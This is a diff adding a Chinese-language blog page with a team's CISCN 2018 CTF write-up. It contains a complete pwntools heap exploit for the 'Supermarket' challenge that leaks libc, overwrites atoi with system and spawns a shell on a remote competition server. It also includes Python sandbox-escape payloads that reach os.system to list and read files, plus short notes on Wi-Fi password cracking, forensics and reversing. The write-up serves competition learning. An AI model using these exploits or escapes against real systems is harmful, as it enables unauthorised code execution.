@@ -1,0 +1,1410 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('本文章已加密') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Vicen Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="The Lounge战队 CISCN2018 Writeup">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2018 Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/index.html">
+<meta property="og:site_name" content="Vicen Blog">
+<meta property="og:description" content="The Lounge战队 CISCN2018 Writeup">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/0.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/12.png">
+<meta property="og:updated_time" content="2018-04-29T19:05:20.137Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CISCN2018 Writeup">
+<meta name="twitter:description" content="The Lounge战队 CISCN2018 Writeup">
+<meta name="twitter:image" content="http://yoursite.com/2018/04/30/wp-2018-ciscn/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/30/wp-2018-ciscn/"/>
+
+
+
+
+
+  <title>CISCN2018 Writeup | Vicen Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Vicen Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Only when you plant the flowers can you really smell their fragrance.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-相册">
+          <a href="/photos/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-photo"></i> <br />
+            
+            相册
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-留言">
+          <a href="/life/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/30/wp-2018-ciscn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Vicen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/assets/img/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Vicen Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CISCN2018 Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T02:36:31+08:00">
+                2018-04-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2018/04/30/wp-2018-ciscn/#SOHUCS" itemprop="discussionUrl">
+                  <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="2018/04/30/wp-2018-ciscn/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="The-Lounge战队-CISCN2018-Writeup"><a href="#The-Lounge战队-CISCN2018-Writeup" class="headerlink" title="The Lounge战队 CISCN2018 Writeup"></a>The Lounge战队 CISCN2018 Writeup</h1><p><img src="/2018/04/30/wp-2018-ciscn/0.png" alt=""></p>
+<a id="more"></a>
+<h2 id="Pwn-Supermarket"><a href="#Pwn-Supermarket" class="headerlink" title="Pwn-Supermarket"></a>Pwn-Supermarket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(name,price,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;price:&quot;,str(price))</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">def listall():</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def delete(name):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line"></span><br><span class="line">def change_price(name,price):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">	p.sendafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;in:&quot;,str(price))</span><br><span class="line"></span><br><span class="line">def change_des(name,size,des):</span><br><span class="line">	p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;5&quot;)</span><br><span class="line">	p.sendlineafter(&quot;name:&quot;,name)</span><br><span class="line">	p.sendlineafter(&quot;descrip_size:&quot;,str(size))</span><br><span class="line">	p.sendlineafter(&quot;description:&quot;,des)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">atoi  0xf7643050  0xf75e4050</span><br><span class="line">puts  0xf75f4140  0xf7603140</span><br><span class="line">free  0xf765d750  0xf75af750</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">local=0</span><br><span class="line">if local:</span><br><span class="line">	p=process(&apos;./task_supermarket&apos;)</span><br><span class="line">	libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	atoi_offset=libc.symbols[&apos;atoi&apos;]</span><br><span class="line">	sys_offset=libc.symbols[&apos;system&apos;]</span><br><span class="line">else:</span><br><span class="line">	p=remote(&apos;117.78.27.192&apos;,32285)</span><br><span class="line">	atoi_offset=0x2d050</span><br><span class="line">	sys_offset=0x3a940</span><br><span class="line"></span><br><span class="line">add(&apos;aaaa&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;1111&apos;,100,0x50,&apos;A&apos;*0x50)</span><br><span class="line">add(&apos;b&apos;*12+&apos;\x41&apos;,100,0x38,&apos;B&apos;*0x38)</span><br><span class="line">add(&apos;cccc&apos;,100,0x60,&apos;C&apos;*0x60)</span><br><span class="line">add(&apos;dddd&apos;,100,0x20,&apos;D&apos;*0x20)</span><br><span class="line">delete(&apos;b&apos;*12+&apos;\x41&apos;)</span><br><span class="line">change_des(&apos;cccc&apos;,0x20,&apos;M&apos;*0x24+p32(0x41))</span><br><span class="line"></span><br><span class="line">add(&apos;eeee&apos;,100,0x38,&apos;EEEE&apos;)</span><br><span class="line">add(&apos;ffff&apos;,100,0x38,p32(101)+p32(0x38)+p32(0x804b048)+p32(0x41))</span><br><span class="line">listall()</span><br><span class="line">p.recvuntil(&quot;101, des.&quot;)</span><br><span class="line"></span><br><span class="line">data=p.recv(4)</span><br><span class="line">print data</span><br><span class="line">atoi_addr=u32(data.ljust(4,&apos;\x00&apos;))</span><br><span class="line">print hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atoi_addr-atoi_offset</span><br><span class="line">system=libc_base+sys_offset</span><br><span class="line">print &quot;system&quot;,hex(system)</span><br><span class="line"></span><br><span class="line">change_des(&apos;eeee&apos;,0x38,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Web-EasyWeb"><a href="#Web-EasyWeb" class="headerlink" title="Web-EasyWeb"></a>Web-EasyWeb</h2><p>无力吐槽的题目，空密码。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/1.png" alt="">  </p>
+<p><img src="/2018/04/30/wp-2018-ciscn/2.png" alt="">  </p>
+<h2 id="Crypto-Flag-in-your-hand"><a href="#Crypto-Flag-in-your-hand" class="headerlink" title="Crypto-Flag_in_your_hand"></a>Crypto-Flag_in_your_hand</h2><p>基本逻辑很简单，看showFlag函数。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/3.png" alt="">  </p>
+<p>判断ic状态来决定是否是正确Token。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/4.png" alt="">  </p>
+<p>文件唯一有改动ic的地方就是这了，看一下逻辑。就是a数组所有值-3转成ASCII字符就是正确Token。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/5.png" alt="">  </p>
+<h2 id="Misc-寻找入侵者"><a href="#Misc-寻找入侵者" class="headerlink" title="Misc-寻找入侵者"></a>Misc-寻找入侵者</h2><p>用mac地址爆破出honey密码</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/6.png" alt=""></p>
+<p><img src="/2018/04/30/wp-2018-ciscn/7.png" alt="">    </p>
+<p>然后使用airdecap-ng提取出另一个数据包，在包里面发现出题人博客以及key.rar的下载地址，下载后解压得到key.pcap，发现可疑字符串，即为flag</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/8.png" alt="">  </p>
+<h2 id="Misc-Memory-Forensic"><a href="#Misc-Memory-Forensic" class="headerlink" title="Misc-Memory_Forensic"></a>Misc-Memory_Forensic</h2><p>很荣幸是三血。其实能更快。首先用IDA看一下逻辑。发现已经出现了”CISCN{“ “}” 和几个疑似flag的字符串，然后他会用snprintf去写内存，那么真flag应该会出现在内存中。<br>我是用的Vmware14配Mac OS High Siera，这样能拿到完整内存Dump。首先关闭System Integrity Protection，然后kextutil agent.kext加载，然后它会黑屏，在黑屏一瞬间切出去，暂停虚拟机。拿到整个内存Dump。然后用16进制编辑器搜索“CISCN{”就行。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/9.png" alt="">  </p>
+<h2 id="Misc-Picture"><a href="#Misc-Picture" class="headerlink" title="Misc-Picture"></a>Misc-Picture</h2><p>首先给了个假的PNG，其实是JPG。FFD9结尾处有数据，提出来，file一下发现是zlib数据，然后直接binwalk解压，给了个Base64字符串，解密后是KP什么的，还有Python code，当时想偏了，以为是PYC文件，修了半天发现格式全错。后来把头部改成PK，是个正常的ZIP文件。然后要密码。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/10.png" alt="">  </p>
+<p>注意右边注释，Python控制台报错？试一下。</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/11.png" alt="">  </p>
+<p>没错，integer division or modulo by zero这是密码。成功解压后是个UUEncode，解密就行了。</p>
+<h2 id="Misc-验证码"><a href="#Misc-验证码" class="headerlink" title="Misc-验证码"></a>Misc-验证码</h2><p>没啥好说的，签到题，进去就有flag。</p>
+<h2 id="Misc-RUN"><a href="#Misc-RUN" class="headerlink" title="Misc-RUN"></a>Misc-RUN</h2><p>Python沙箱逃逸，试了很多Payload。所有的popen都会报unkonw error。所有的二阶<strong>dict</strong>也会报错，后来想到找一个<strong>globals</strong>。<br>x = [x for x in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() if x.<strong>name</strong> == ‘ca’+’tch_warnings’][0].<strong>init</strong><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;l&#39;+&#39;s /home/ctf&#39;">‘sy’+’stem’</a><br>x.<strong>getattribute</strong>(“func_global”+”s”)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="&#39;ca&#39;+&#39;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;">‘sy’+’stem’</a></p>
+<h2 id="Reverse-RE"><a href="#Reverse-RE" class="headerlink" title="Reverse-RE"></a>Reverse-RE</h2><p>程序先检测flag格式头，然后根据“_”将内容分为三个部分，分别加密之后与字符串比较，前两个部分的内容很容易得到，解开md5值为tofu和gana，第三部分flag的MD5无法解开，卡了两三个小时，看到第三个函数与其他两个的区别是后面将大量数据写到一个叫“flag”的文件中，但是需要异或的两个key值，分别和数据奇数项和偶数项异或，因为看到第一个数据和第三个数据相同，猜测文件是jepg格式，果然解出来是张图片，连在一起即为完整flag.</p>
+<p><img src="/2018/04/30/wp-2018-ciscn/12.png" alt="">  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Thanks For Reward</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/assets/img/weixin.jpg" alt="Vicen 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/assets/img/alipay.jpg" alt="Vicen 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/30/mips/" rel="next" title="mips程序调试">
+                <i class="fa fa-chevron-left"></i> mips程序调试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="SOHUCS"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/assets/img/touxiang.jpg"
+                alt="Vicen" />
+            
+              <p class="site-author-name" itemprop="name">Vicen</p>
+              <p class="site-description motion-element" itemprop="description">To Be a Better Me</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  <a title="�ղص���ǩ��ż��Highһ��^_^" rel="alternate" class="mw-harlem_shake_slow wobble shake" href='javascript:(function() {
+    function c() {
+        var e = document.createElement("link");
+        e.setAttribute("type", "text/css");
+        e.setAttribute("rel", "stylesheet");
+        e.setAttribute("href", f);
+        e.setAttribute("class", l);
+        document.body.appendChild(e)
+    }
+ 
+    function h() {
+        var e = document.getElementsByClassName(l);
+        for (var t = 0; t < e.length; t++) {
+            document.body.removeChild(e[t])
+        }
+    }
+ 
+    function p() {
+        var e = document.createElement("div");
+        e.setAttribute("class", a);
+        document.body.appendChild(e);
+        setTimeout(function() {
+            document.body.removeChild(e)
+        }, 100)
+    }
+ 
+    function d(e) {
+        return {
+            height : e.offsetHeight,
+            width : e.offsetWidth
+        }
+    }
+ 
+    function v(i) {
+        var s = d(i);
+        return s.height > e && s.height < n && s.width > t && s.width < r
+    }
+ 
+    function m(e) {
+        var t = e;
+        var n = 0;
+        while (!!t) {
+            n += t.offsetTop;
+            t = t.offsetParent
+        }
+        return n
+    }
+ 
+    function g() {
+        var e = document.documentElement;
+        if (!!window.innerWidth) {
+            return window.innerHeight
+        } else if (e && !isNaN(e.clientHeight)) {
+            return e.clientHeight
+        }
+        return 0
+    }
+ 
+    function y() {
+        if (window.pageYOffset) {
+            return window.pageYOffset
+        }
+        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
+    }
+ 
+    function E(e) {
+        var t = m(e);
+        return t >= w && t <= b + w
+    }
+ 
+    function S() {
+        var e = document.createElement("audio");
+        e.setAttribute("class", l);
+        e.src = i;
+        e.loop = false;
+        e.addEventListener("canplay", function() {
+            setTimeout(function() {
+                x(k)
+            }, 500);
+            setTimeout(function() {
+                N();
+                p();
+                for (var e = 0; e < O.length; e++) {
+                    T(O[e])
+                }
+            }, 15500)
+        }, true);
+        e.addEventListener("ended", function() {
+            N();
+            h()
+        }, true);
+        e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
+        document.body.appendChild(e);
+        e.play()
+    }
+ 
+    function x(e) {
+        e.className += " " + s + " " + o
+    }
+ 
+    function T(e) {
+        e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
+    }
+ 
+    function N() {
+        var e = document.getElementsByClassName(s);
+        var t = new RegExp("\\b" + s + "\\b");
+        for (var n = 0; n < e.length; ) {
+            e[n].className = e[n].className.replace(t, "")
+        }
+    }
+ 
+    var e = 30;
+    var t = 30;
+    var n = 350;
+    var r = 350;
+    var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
+    var s = "mw-harlem_shake_me";
+    var o = "im_first";
+    var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
+    var a = "mw-strobe_light";
+    var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
+    var l = "mw_added_css";
+    var b = g();
+    var w = y();
+    var C = document.getElementsByTagName("*");
+    var k = null;
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            if (E(A)) {
+                k = A;
+                break
+            }
+        }
+    }
+    if (A === null) {
+        console.warn("Could not find a node of the right size. Please try a different page.");
+        return
+    }
+    c();
+    S();
+    var O = [];
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            O.push(A)
+        }
+    }
+})()'><i class="fa fa-music"></i> High</a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/ppsuc" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:szez0037@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/wang-xiao-48-48?utm_source=wechat_session&utm_medium=social&from=singlemessage" target="_blank" title="Zhihu">
+                    
+                      <i class="fa fa-fw fa-bolt"></i>Zhihu</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.219.me/" title="219" target="_blank">219</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/qq_33699981/article/details/72716951" title="Next主题" target="_blank">Next主题</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.36zhen.com/t?id=3448" title="前端资料" target="_blank">前端资料</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.jianshu.com/p/ab24f22599a2" title="CTF常用工具" target="_blank">CTF常用工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://bestwing.me" title="Swing" target="_blank">Swing</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.sqlsec.com/" title="国光" target="_blank">国光</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cherryblog.site/" title="cherry" target="_blank">cherry</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
